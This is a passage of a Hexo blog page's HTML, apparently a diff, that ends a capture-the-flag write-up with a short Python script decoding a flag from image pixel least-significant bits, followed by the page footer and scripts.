class="built_in">list</span>(pix)[<span class="number">1</span>]%<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bitstr:</span><br><span class="line">    flag+=i</span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    cnt%=<span class="number">8</span></span><br><span class="line">    b+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(cnt == <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(trans(flag),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8D%97%E4%BA%AC%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E8%90%8C%E6%96%B0%E6%9D%AF/" rel="tag"># 南京理工大学萌新杯</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/p/44961621.html" rel="prev" title="NUSTCTF2022">
+                  <i class="fa fa-angle-left"></i> NUSTCTF2022
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">C.A.T.</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
